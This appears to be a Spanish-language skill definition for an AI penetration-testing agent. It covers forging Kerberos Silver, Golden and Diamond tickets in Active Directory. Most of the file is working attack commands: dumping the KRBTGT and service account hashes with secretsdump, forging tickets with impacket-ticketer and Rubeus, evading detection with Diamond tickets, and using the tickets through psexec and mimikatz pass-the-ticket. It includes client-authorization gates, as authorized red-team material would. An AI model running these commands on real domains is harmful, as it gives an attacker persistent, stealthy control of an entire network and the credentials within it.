---
name: ad-silver-golden-ticket
description: Forjar tickets Kerberos — Silver (service access), Golden (dominio completo), Diamond (Golden sigiloso)
phase: post
---

# Silver / Golden / Diamond Ticket

## Activation Contract

**Cuando se usa:** Post-explotacion con acceso a Domain Admin, KRBTGT hash, o Service Account hash.

**Input requerido:**
- `domain_sid`: SID del dominio (via `impacket-lookupsid` o BloodHound)
- `krbtgt_hash`: NTLM hash del account KRBTGT (para Golden/Diamond)
- `service_hash`: NTLM hash del service account (para Silver)
- `target_user`: usuario a impersonar (default: `Administrator`)
- `target_service`: SPN del servicio objetivo (Silver)
- `dc_ip`: IP del Domain Controller

**Herramientas:** impacket-ticketer, mimikatz, Rubeus, impacket-secretsdump

## Hard Rules

1. NO forjar tickets sin autorizacion explicita del cliente (equivale a ser Domain Admin)
2. Los tickets tienen vida util:
   - Silver: 10 años por defecto (modificable)
   - Golden: 10 años por defecto
   - Diamond: hereda vida util del TGT original
3. Documentar cada ticket creado: usuario, servicio, hora de creacion
4. Los tickets Silver solo dan acceso al servicio especifico, no al dominio
5. El hash KRBTGT solo se obtiene una vez por DC — si cambia, todos los Golden tickets se invalidan

## Decision Gates

Preguntar antes de cada accion:

- **Forjar Golden Ticket**: "Vamos a forjar un Golden Ticket con el hash KRBTGT. Esto otorga acceso completo al dominio. ?Proceder?"
- **Forjar Silver Ticket**: "Vamos a forjar un Silver Ticket para el servicio SPN `<service>`. ?Continuar?"
- **Diamond Ticket**: "Vamos a modificar un TGT legitimo para evadir deteccion. ?Ejecutar?"
- **Usar mimikatz**: "Se requiere mimikatz en el host target. ?Autorizado?"

## Execution Steps

### 1. Obtener requisitos

```bash
# SID del dominio
impacket-lookupsid <domain>/<user>:<pass>@<dc_ip> | grep "Domain SID"

# Hash KRBTGT (requiere DA)
impacket-secretsdump <domain>/<user>:<pass>@<dc_ip> -just-dc-user krbtgt

# Hash service account (Silver)
impacket-secretsdump <domain>/<user>:<pass>@<dc_ip> -just-dc-user <service_account>
```

### 2. Forjar Silver Ticket

```bash
impacket-ticketer -nthash <service_ntlm_hash> -domain-sid <domain_sid> \
  -domain <domain> -spn <service_spn> -user-id 500 <target_user>
export KRB5CCNAME=/path/to/ticket.ccache
```

Accede al servicio especifico sin mas autenticacion.

### 3. Forjar Golden Ticket

```bash
impacket-ticketer -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> \
  -domain <domain> -user-id 500 <target_user>
export KRB5CCNAME=/path/to/ticket.ccache
```

Con Golden Ticket puedes acceder a cualquier recurso del dominio.

### 4. Diamond Ticket (sigiloso)

```bash
# Extraer TGT legitimo, descifrarlo con hash KRBTGT, modificar claims, recifrarlo
# Rubeus en Windows:
Rubeus.exe diamond /tgtdeleg /ticketuser:<target_user> /ticketuserid:500 \
  /krbkey:<krbtgt_aes256_key> /nowrap
```

El Diamond Ticket mantiene el encabezado original del TGT, evadiendo firmas de deteccion que buscan tickets con timestamps anormales.

### 5. Usar los tickets

```bash
# Linux (impacket)
export KRB5CCNAME=/tmp/ticket.ccache
impacket-psexec <domain>/<user>@<target> -k -no-pass

# Windows (mimikatz)
kerberos::ptt ticket.kirbi
dir \\dc.domain.com\c$
```

## Output Contract

```json
{
  "skill": "ad-silver-golden-ticket",
  "phase": "post",
  "ticket_type": "golden",
  "domain": "domain.local",
  "forged_user": "Administrator",
  "krbtgt_hash_used": true,
  "target_service": null,
  "commands_executed": [
    "impacket-ticketer -nthash <hash> -domain-sid S-1-5-21-... -domain domain.local Administrator"
  ],
  "ticket_file": "/tmp/Administrator.ccache",
  "access_gained": ["\\\\dc.domain.local\\c$", "\\\\sql.domain.local\\mssql"],
  "detection_risk": "high",
  "cleaning_steps": ["Remove ticket file from /tmp"]
}
```
